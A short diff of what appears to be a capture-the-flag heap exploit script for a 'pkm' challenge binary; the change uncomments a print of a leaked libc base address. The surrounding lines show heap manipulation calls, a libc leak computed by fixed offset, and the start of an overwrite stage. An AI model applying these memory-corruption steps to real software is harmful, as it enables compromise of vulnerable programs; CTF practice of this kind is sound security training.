@@ -121,7 +121,7 @@ kill_pkm(r, 6)
 rename_pkm(r, 3, ["aaaa"], 0xf8)                  #NAME3 -> PKM4
 kill_pkm(r, 4)                                  #edits NAME3 with fd
 LIBC.address = get_leak(r) - 0x3e2c80
-#print_red(hex(LIBC.address))
+print_red(hex(LIBC.address))
 
 #OVERWRITE
 add_pkm(r)                                      #PKM4 -> NAME3
